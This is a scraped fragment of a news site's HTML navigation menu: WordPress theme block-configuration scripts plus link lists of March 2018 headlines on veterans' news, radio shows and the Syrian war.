<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/13/russias-pantsir-air-defense-system-may-go-hypersonic/" rel="bookmark" title="Russia&#8217;s Pantsir Air Defense System May Go Hypersonic">Russia&#8217;s Pantsir Air Defense System May Go Hypersonic</a></h3> </div>
</div>
</div></div></div><div class="td-next-prev-wrap"><a href="#" class="td-ajax-prev-page ajax-page-disabled" id="prev-page-td_uid_30_5aaf778c190fb" data-td_block_id="td_uid_30_5aaf778c190fb" target="_blank" rel="nofollow"><i class="td-icon-font td-icon-menu-left"></i></a><a href="#" class="td-ajax-next-page" id="next-page-td_uid_30_5aaf778c190fb" data-td_block_id="td_uid_30_5aaf778c190fb" target="_blank" rel="nofollow"><i class="td-icon-font td-icon-menu-right"></i></a></div><div class="clearfix"></div></div> </div></div></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-mega-menu menu-item-464560"><a href="https://www.veteranstoday.com/category/news/">Veterans</a>
<ul class="sub-menu">
<li class="menu-item-0"><div class="td-container-border"><div class="td-mega-grid"><div class="td_block_wrap td_block_mega_menu td_uid_31_5aaf778c1c36a_rand td_with_ajax_pagination td-pb-border-top td_block_template_1" data-td-block-uid="td_uid_31_5aaf778c1c36a"><script>var block_td_uid_31_5aaf778c1c36a = new tdBlock();
block_td_uid_31_5aaf778c1c36a.id = "td_uid_31_5aaf778c1c36a";
block_td_uid_31_5aaf778c1c36a.atts = '{"limit":4,"sort":"","post_ids":"","tag_slug":"","autors_id":"","installed_post_types":"","category_id":"70361","category_ids":"","custom_title":"","custom_url":"","show_child_cat":30,"sub_cat_ajax":"","ajax_pagination":"next_prev","header_color":"","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":3,"td_ajax_preloading":"","td_ajax_filter_type":"td_category_ids_filter","td_ajax_filter_ids":"","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_31_5aaf778c1c36a_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_31_5aaf778c1c36a_rand","tdc_css_class_style":"td_uid_31_5aaf778c1c36a_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_31_5aaf778c1c36a.td_column_number = "3";
block_td_uid_31_5aaf778c1c36a.block_type = "td_block_mega_menu";
block_td_uid_31_5aaf778c1c36a.post_count = "4";
block_td_uid_31_5aaf778c1c36a.found_posts = "1433";
block_td_uid_31_5aaf778c1c36a.header_color = "";
block_td_uid_31_5aaf778c1c36a.ajax_pagination_infinite_stop = "";
block_td_uid_31_5aaf778c1c36a.max_num_pages = "359";
tdBlocksArray.push(block_td_uid_31_5aaf778c1c36a);
</script><div class="td_mega_menu_sub_cats"><div class="block-mega-child-cats"><a class="cur-sub-cat mega-menu-sub-cat-td_uid_31_5aaf778c1c36a" id="td_uid_32_5aaf778c1ce4f" data-td_block_id="td_uid_31_5aaf778c1c36a" data-td_filter_value="" href="https://www.veteranstoday.com/category/news/">All</a><a class="mega-menu-sub-cat-td_uid_31_5aaf778c1c36a" id="td_uid_33_5aaf778c1cedb" data-td_block_id="td_uid_31_5aaf778c1c36a" data-td_filter_value="18" href="https://www.veteranstoday.com/category/news/heroes/">Heroes</a><a class="mega-menu-sub-cat-td_uid_31_5aaf778c1c36a" id="td_uid_34_5aaf778c1cf79" data-td_block_id="td_uid_31_5aaf778c1c36a" data-td_filter_value="26" href="https://www.veteranstoday.com/category/news/veterans-organizations/">Veteran Service Organizations &amp; Charities</a><a class="mega-menu-sub-cat-td_uid_31_5aaf778c1c36a" id="td_uid_35_5aaf778c1d012" data-td_block_id="td_uid_31_5aaf778c1c36a" data-td_filter_value="24" href="https://www.veteranstoday.com/category/news/veterans-administration/">Veterans Administration (VA)</a></div></div><div id=td_uid_31_5aaf778c1c36a class="td_block_inner"><div class="td-mega-row"><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/truth4troops/" rel="bookmark" title="Support our troops—tell them the truth!"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/Kevin-Penn-Magazine4-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/Kevin-Penn-Magazine4-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/Kevin-Penn-Magazine4-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Support our troops—tell them the truth!" /></a></div> <a href="https://www.veteranstoday.com/category/news/" class="td-post-category">Veterans News</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/truth4troops/" rel="bookmark" title="Support our troops—tell them the truth!">Support our troops—tell them the truth!</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/16/top-5-veterans-news-march-17th-2018/" rel="bookmark" title="Top 5 Veterans News:  March 17th, 2018"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/Top-5-Veterans-News-Stories-February-20th-2-218x150.gif" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/Top-5-Veterans-News-Stories-February-20th-2-218x150.gif 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/Top-5-Veterans-News-Stories-February-20th-2-100x70.gif 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Top 5 Veterans News:  March 17th, 2018" /></a></div> <a href="https://www.veteranstoday.com/category/news/" class="td-post-category">Veterans News</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/16/top-5-veterans-news-march-17th-2018/" rel="bookmark" title="Top 5 Veterans News:  March 17th, 2018">Top 5 Veterans News: March 17th, 2018</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/11/top-5-veterans-news-march-10th-2018/" rel="bookmark" title="Top 5 Veterans News:  March 11th, 2018"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/Top-5-Veterans-News-Stories-February-20th-1-218x150.gif" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/Top-5-Veterans-News-Stories-February-20th-1-218x150.gif 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/Top-5-Veterans-News-Stories-February-20th-1-100x70.gif 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Top 5 Veterans News:  March 11th, 2018" /></a></div> <a href="https://www.veteranstoday.com/category/news/" class="td-post-category">Veterans News</a> </div>
<div class="item-details">
 <h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/11/top-5-veterans-news-march-10th-2018/" rel="bookmark" title="Top 5 Veterans News:  March 11th, 2018">Top 5 Veterans News: March 11th, 2018</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/07/top-5-veterans-news-march-7th-2018/" rel="bookmark" title="Top 5 Veterans News:  March 7th, 2018"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/02/Top-5-Veterans-stories-february-9-1-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/02/Top-5-Veterans-stories-february-9-1-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/02/Top-5-Veterans-stories-february-9-1-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Top 5 Veterans News:  March 7th, 2018" /></a></div> <a href="https://www.veteranstoday.com/category/news/" class="td-post-category">Veterans News</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/07/top-5-veterans-news-march-7th-2018/" rel="bookmark" title="Top 5 Veterans News:  March 7th, 2018">Top 5 Veterans News: March 7th, 2018</a></h3> </div>
</div>
</div></div></div><div class="td-next-prev-wrap"><a href="#" class="td-ajax-prev-page ajax-page-disabled" id="prev-page-td_uid_31_5aaf778c1c36a" data-td_block_id="td_uid_31_5aaf778c1c36a" target="_blank" rel="nofollow"><i class="td-icon-font td-icon-menu-left"></i></a><a href="#" class="td-ajax-next-page" id="next-page-td_uid_31_5aaf778c1c36a" data-td_block_id="td_uid_31_5aaf778c1c36a" target="_blank" rel="nofollow"><i class="td-icon-font td-icon-menu-right"></i></a></div><div class="clearfix"></div></div> </div></div></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-mega-menu menu-item-464561"><a href="https://www.veteranstoday.com/category/vt-radio/">VT Radio</a>
<ul class="sub-menu">
<li class="menu-item-0"><div class="td-container-border"><div class="td-mega-grid"><div class="td_block_wrap td_block_mega_menu td_uid_36_5aaf778c1ed99_rand td_with_ajax_pagination td-pb-border-top td_block_template_1" data-td-block-uid="td_uid_36_5aaf778c1ed99"><script>var block_td_uid_36_5aaf778c1ed99 = new tdBlock();
block_td_uid_36_5aaf778c1ed99.id = "td_uid_36_5aaf778c1ed99";
block_td_uid_36_5aaf778c1ed99.atts = '{"limit":4,"sort":"","post_ids":"","tag_slug":"","autors_id":"","installed_post_types":"","category_id":"70365","category_ids":"","custom_title":"","custom_url":"","show_child_cat":30,"sub_cat_ajax":"","ajax_pagination":"next_prev","header_color":"","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":3,"td_ajax_preloading":"","td_ajax_filter_type":"td_category_ids_filter","td_ajax_filter_ids":"","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_36_5aaf778c1ed99_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_36_5aaf778c1ed99_rand","tdc_css_class_style":"td_uid_36_5aaf778c1ed99_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_36_5aaf778c1ed99.td_column_number = "3";
block_td_uid_36_5aaf778c1ed99.block_type = "td_block_mega_menu";
block_td_uid_36_5aaf778c1ed99.post_count = "4";
block_td_uid_36_5aaf778c1ed99.found_posts = "380";
block_td_uid_36_5aaf778c1ed99.header_color = "";
block_td_uid_36_5aaf778c1ed99.ajax_pagination_infinite_stop = "";
block_td_uid_36_5aaf778c1ed99.max_num_pages = "95";
tdBlocksArray.push(block_td_uid_36_5aaf778c1ed99);
</script><div class="td_mega_menu_sub_cats"><div class="block-mega-child-cats"><a class="cur-sub-cat mega-menu-sub-cat-td_uid_36_5aaf778c1ed99" id="td_uid_37_5aaf778c1fac5" data-td_block_id="td_uid_36_5aaf778c1ed99" data-td_filter_value="" href="https://www.veteranstoday.com/category/vt-radio/">All</a><a class="mega-menu-sub-cat-td_uid_36_5aaf778c1ed99" id="td_uid_38_5aaf778c1fb57" data-td_block_id="td_uid_36_5aaf778c1ed99" data-td_filter_value="74119" href="https://www.veteranstoday.com/category/vt-radio/false-flag-weekly-news/">False Flag Weekly News</a><a class="mega-menu-sub-cat-td_uid_36_5aaf778c1ed99" id="td_uid_39_5aaf778c1fbf3" data-td_block_id="td_uid_36_5aaf778c1ed99" data-td_filter_value="72744" href="https://www.veteranstoday.com/category/vt-radio/punishradio/">PunishRadio</a><a class="mega-menu-sub-cat-td_uid_36_5aaf778c1ed99" id="td_uid_40_5aaf778c1fc8a" data-td_block_id="td_uid_36_5aaf778c1ed99" data-td_filter_value="72653" href="https://www.veteranstoday.com/category/vt-radio/rag-radio/">Rag Radio</a><a class="mega-menu-sub-cat-td_uid_36_5aaf778c1ed99" id="td_uid_41_5aaf778c1fd21" data-td_block_id="td_uid_36_5aaf778c1ed99" data-td_filter_value="72729" href="https://www.veteranstoday.com/category/vt-radio/speaking-truth-to-empire/">Speaking Truth To Empire</a><a class="mega-menu-sub-cat-td_uid_36_5aaf778c1ed99" id="td_uid_42_5aaf778c1fdb7" data-td_block_id="td_uid_36_5aaf778c1ed99" data-td_filter_value="72654" href="https://www.veteranstoday.com/category/vt-radio/trad-cat-knight-radio/">Trad Cat Knight Radio</a><a class="mega-menu-sub-cat-td_uid_36_5aaf778c1ed99" id="td_uid_43_5aaf778c1fe4b" data-td_block_id="td_uid_36_5aaf778c1ed99" data-td_filter_value="72655" href="https://www.veteranstoday.com/category/vt-radio/truth-jihad/">Truth Jihad</a></div></div><div id=td_uid_36_5aaf778c1ed99 class="td_block_inner"><div class="td-mega-row"><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/16/ffwn-winning/" rel="bookmark" title="FFWN: &#8220;Conspiracy Theories&#8221; winning the debate!"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/maxresdefault-25-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/maxresdefault-25-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/maxresdefault-25-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="FFWN: &#8220;Conspiracy Theories&#8221; winning the debate!" /><span class="td-video-play-ico"><img width="40" height="40" class="td-retina" src="https://www.veteranstoday.com/wp-content/themes/Newspaper/images/icons/ico-video-large.png" alt="video" /></span></a></div> <a href="https://www.veteranstoday.com/category/vt-radio/false-flag-weekly-news/" class="td-post-category">False Flag Weekly News</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/16/ffwn-winning/" rel="bookmark" title="FFWN: &#8220;Conspiracy Theories&#8221; winning the debate!">FFWN: &#8220;Conspiracy Theories&#8221; winning the debate!</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/16/tck-radio-peter-mccarthy-prophecy-crisis-in-church-new-world-order/" rel="bookmark" title="TCK RADIO: Peter McCarthy &#8220;Prophecy, Crisis in Church &amp; New World Order&#8221;"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/maxresdefault-24-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/maxresdefault-24-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/maxresdefault-24-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="TCK RADIO: Peter McCarthy &#8220;Prophecy, Crisis in Church &amp; New World Order&#8221;" /><span class="td-video-play-ico"><img width="40" height="40" class="td-retina" src="https://www.veteranstoday.com/wp-content/themes/Newspaper/images/icons/ico-video-large.png" alt="video" /></span></a></div> <a href="https://www.veteranstoday.com/category/vt-radio/trad-cat-knight-radio/" class="td-post-category">Trad Cat Knight Radio</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/16/tck-radio-peter-mccarthy-prophecy-crisis-in-church-new-world-order/" rel="bookmark" title="TCK RADIO: Peter McCarthy &#8220;Prophecy, Crisis in Church &amp; New World Order&#8221;">TCK RADIO: Peter McCarthy &#8220;Prophecy, Crisis in Church &amp; New World&#8230;</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/15/tck-radio-michael-hichborn-latest-scandals-corruption-in-the-church/" rel="bookmark" title="TCK RADIO: Michael Hichborn &#8220;Latest Scandals &amp; Corruption In The Church&#8221;"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/1-9-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/1-9-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/1-9-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="TCK RADIO: Michael Hichborn &#8220;Latest Scandals &amp; Corruption In The Church&#8221;" /><span class="td-video-play-ico"><img width="40" height="40" class="td-retina" src="https://www.veteranstoday.com/wp-content/themes/Newspaper/images/icons/ico-video-large.png" alt="video" /></span></a></div> <a href="https://www.veteranstoday.com/category/vt-radio/trad-cat-knight-radio/" class="td-post-category">Trad Cat Knight Radio</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/15/tck-radio-michael-hichborn-latest-scandals-corruption-in-the-church/" rel="bookmark" title="TCK RADIO: Michael Hichborn &#8220;Latest Scandals &amp; Corruption In The Church&#8221;">TCK RADIO: Michael Hichborn &#8220;Latest Scandals &amp; Corruption In The Church&#8221;</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/14/tck-radio-fr-voigt-temptations-a-test-of-love/" rel="bookmark" title="TCK RADIO: Fr. Voigt &#8220;Temptations: A Test of Love&#8221;"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/1-8-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/1-8-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/1-8-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="TCK RADIO: Fr. Voigt &#8220;Temptations: A Test of Love&#8221;" /><span class="td-video-play-ico"><img width="40" height="40" class="td-retina" src="https://www.veteranstoday.com/wp-content/themes/Newspaper/images/icons/ico-video-large.png" alt="video" /></span></a></div> <a href="https://www.veteranstoday.com/category/vt-radio/trad-cat-knight-radio/" class="td-post-category">Trad Cat Knight Radio</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/14/tck-radio-fr-voigt-temptations-a-test-of-love/" rel="bookmark" title="TCK RADIO: Fr. Voigt &#8220;Temptations: A Test of Love&#8221;">TCK RADIO: Fr. Voigt &#8220;Temptations: A Test of Love&#8221;</a></h3> </div>
</div>
</div></div></div><div class="td-next-prev-wrap"><a href="#" class="td-ajax-prev-page ajax-page-disabled" id="prev-page-td_uid_36_5aaf778c1ed99" data-td_block_id="td_uid_36_5aaf778c1ed99" target="_blank" rel="nofollow"><i class="td-icon-font td-icon-menu-left"></i></a><a href="#" class="td-ajax-next-page" id="next-page-td_uid_36_5aaf778c1ed99" data-td_block_id="td_uid_36_5aaf778c1ed99" target="_blank" rel="nofollow"><i class="td-icon-font td-icon-menu-right"></i></a></div><div class="clearfix"></div></div> </div></div></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-mega-menu menu-item-464563"><a href="https://www.veteranstoday.com/category/wars/">WarZone</a>
<ul class="sub-menu">
<li class="menu-item-0"><div class="td-container-border"><div class="td-mega-grid"><div class="td_block_wrap td_block_mega_menu td_uid_44_5aaf778c21e97_rand td_with_ajax_pagination td-pb-border-top td_block_template_1" data-td-block-uid="td_uid_44_5aaf778c21e97"><script>var block_td_uid_44_5aaf778c21e97 = new tdBlock();
block_td_uid_44_5aaf778c21e97.id = "td_uid_44_5aaf778c21e97";
block_td_uid_44_5aaf778c21e97.atts = '{"limit":4,"sort":"","post_ids":"","tag_slug":"","autors_id":"","installed_post_types":"","category_id":"65","category_ids":"","custom_title":"","custom_url":"","show_child_cat":30,"sub_cat_ajax":"","ajax_pagination":"next_prev","header_color":"","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":3,"td_ajax_preloading":"","td_ajax_filter_type":"td_category_ids_filter","td_ajax_filter_ids":"","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_44_5aaf778c21e97_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_44_5aaf778c21e97_rand","tdc_css_class_style":"td_uid_44_5aaf778c21e97_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_44_5aaf778c21e97.td_column_number = "3";
block_td_uid_44_5aaf778c21e97.block_type = "td_block_mega_menu";
block_td_uid_44_5aaf778c21e97.post_count = "4";
block_td_uid_44_5aaf778c21e97.found_posts = "2265";
block_td_uid_44_5aaf778c21e97.header_color = "";
block_td_uid_44_5aaf778c21e97.ajax_pagination_infinite_stop = "";
block_td_uid_44_5aaf778c21e97.max_num_pages = "567";
tdBlocksArray.push(block_td_uid_44_5aaf778c21e97);
</script><div class="td_mega_menu_sub_cats"><div class="block-mega-child-cats"><a class="cur-sub-cat mega-menu-sub-cat-td_uid_44_5aaf778c21e97" id="td_uid_45_5aaf778c22b3a" data-td_block_id="td_uid_44_5aaf778c21e97" data-td_filter_value="" href="https://www.veteranstoday.com/category/wars/">All</a><a class="mega-menu-sub-cat-td_uid_44_5aaf778c21e97" id="td_uid_46_5aaf778c22bc7" data-td_block_id="td_uid_44_5aaf778c21e97" data-td_filter_value="21" href="https://www.veteranstoday.com/category/wars/afghanistan-and-pakistan/">Afghanistan War</a><a class="mega-menu-sub-cat-td_uid_44_5aaf778c21e97" id="td_uid_47_5aaf778c22c64" data-td_block_id="td_uid_44_5aaf778c21e97" data-td_filter_value="18324" href="https://www.veteranstoday.com/category/wars/new-world-order-war/">New World Order (NWO)</a><a class="mega-menu-sub-cat-td_uid_44_5aaf778c21e97" id="td_uid_48_5aaf778c22cfa" data-td_block_id="td_uid_44_5aaf778c21e97" data-td_filter_value="36963" href="https://www.veteranstoday.com/category/wars/ukraine-wars/">Ukraine Wars</a><a class="mega-menu-sub-cat-td_uid_44_5aaf778c21e97" id="td_uid_49_5aaf778c22d91" data-td_block_id="td_uid_44_5aaf778c21e97" data-td_filter_value="26685" href="https://www.veteranstoday.com/category/wars/syria-war/">War in Syria</a></div></div><div id=td_uid_44_5aaf778c21e97 class="td_block_inner"><div class="td-mega-row"><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/neo-teetering-on-the-edge-of-nuclear-war/" rel="bookmark" title="NEO &#8211; Teetering on the Edge of Nuclear War"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/5543-1-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/5543-1-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/5543-1-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="NEO &#8211; Teetering on the Edge of Nuclear War" /></a></div> <a href="https://www.veteranstoday.com/category/wars/" class="td-post-category">WarZone</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/neo-teetering-on-the-edge-of-nuclear-war/" rel="bookmark" title="NEO &#8211; Teetering on the Edge of Nuclear War">NEO &#8211; Teetering on the Edge of Nuclear War</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/breaking-us-terror-forces-plead-for-ceasefire-in-east-ghouta/" rel="bookmark" title="Breaking &#8211; US Terror forces plead for ceasefire in East Ghouta"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/Ghouta-jihadis-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/Ghouta-jihadis-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/Ghouta-jihadis-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Breaking &#8211; US Terror forces plead for ceasefire in East Ghouta" /></a></div> <a href="https://www.veteranstoday.com/category/wars/" class="td-post-category">WarZone</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/breaking-us-terror-forces-plead-for-ceasefire-in-east-ghouta/" rel="bookmark" title="Breaking &#8211; US Terror forces plead for ceasefire in East Ghouta">Breaking &#8211; US Terror forces plead for ceasefire in East Ghouta</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/assads-exdous-68000-from-east-ghouta-freed-from-us-backed-terrorists/" rel="bookmark" title="ASSAD&#8217;s EXODUS &#8211; 68,000 from East Ghouta free from US-backed terrorists"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/5aae052efc7e9351778b45ab-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/5aae052efc7e9351778b45ab-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/5aae052efc7e9351778b45ab-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="ASSAD&#8217;s EXODUS &#8211; 68,000 from East Ghouta free from US-backed terrorists" /></a></div> <a href="https://www.veteranstoday.com/category/wars/" class="td-post-category">WarZone</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/assads-exdous-68000-from-east-ghouta-freed-from-us-backed-terrorists/" rel="bookmark" title="ASSAD&#8217;s EXODUS &#8211; 68,000 from East Ghouta free from US-backed terrorists">ASSAD&#8217;s EXODUS &#8211; 68,000 from East Ghouta free from US-backed terrorists</a></h3> </div>
</div>
</div><div class="td-mega-span">
<div class="td_module_mega_menu td_mod_mega_menu">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/russia-and-iran-vs-the-new-world-order/" rel="bookmark" title="Russia and Iran vs. The New World Order"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/iran2-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/iran2-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/iran2-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Russia and Iran vs. The New World Order" /></a></div> <a href="https://www.veteranstoday.com/category/wars/new-world-order-war/" class="td-post-category">New World Order (NWO)</a> </div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/russia-and-iran-vs-the-new-world-order/" rel="bookmark" title="Russia and Iran vs. The New World Order">Russia and Iran vs. The New World Order</a></h3> </div>
</div>
</div></div></div><div class="td-next-prev-wrap"><a href="#" class="td-ajax-prev-page ajax-page-disabled" id="prev-page-td_uid_44_5aaf778c21e97" data-td_block_id="td_uid_44_5aaf778c21e97" target="_blank" rel="nofollow"><i class="td-icon-font td-icon-menu-left"></i></a><a href="#" class="td-ajax-next-page" id="next-page-td_uid_44_5aaf778c21e97" data-td_block_id="td_uid_44_5aaf778c21e97" target="_blank" rel="nofollow"><i class="td-icon-font td-icon-menu-right"></i></a></div><div class="clearfix"></div></div> </div></div></li>
</ul>
</li>
<li class="menu-item menu-item-type-taxonomy menu-item-object-category td-menu-item td-mega-menu menu-item-464562"><a href="https://www.veteranstoday.com/category/world-global/">World</a>
<ul class="sub-menu">
<li class="menu-item-0"><div class="td-container-border"><div class="td-mega-grid"><div class="td_block_wrap td_block_mega_menu td_uid_50_5aaf778c24bb2_rand td_with_ajax_pagination td-pb-border-top td_block_template_1" data-td-block-uid="td_uid_50_5aaf778c24bb2"><script>var block_td_uid_50_5aaf778c24bb2 = new tdBlock();
block_td_uid_50_5aaf778c24bb2.id = "td_uid_50_5aaf778c24bb2";
block_td_uid_50_5aaf778c24bb2.atts = '{"limit":4,"sort":"","post_ids":"","tag_slug":"","autors_id":"","installed_post_types":"","category_id":"7270","category_ids":"","custom_title":"","custom_url":"","show_child_cat":30,"sub_cat_ajax":"","ajax_pagination":"next_prev","header_color":"","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":3,"td_ajax_preloading":"","td_ajax_filter_type":"td_category_ids_filter","td_ajax_filter_ids":"","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_50_5aaf778c24bb2_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_50_5aaf778c24bb2_rand","tdc_css_class_style":"td_uid_50_5aaf778c24bb2_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_50_5aaf778c24bb2.td_column_number = "3";
block_td_uid_50_5aaf778c24bb2.block_type = "td_block_mega_menu";
block_td_uid_50_5aaf778c24bb2.post_count = "4";
block_td_uid_50_5aaf778c24bb2.found_posts = "4000";
block_td_uid_50_5aaf778c24bb2.header_color = "";
block_td_uid_50_5aaf778c24bb2.ajax_pagination_infinite_stop = "";
block_td_uid_50_5aaf778c24bb2.max_num_pages = "1000";
tdBlocksArray.push(block_td_uid_50_5aaf778c24bb2);
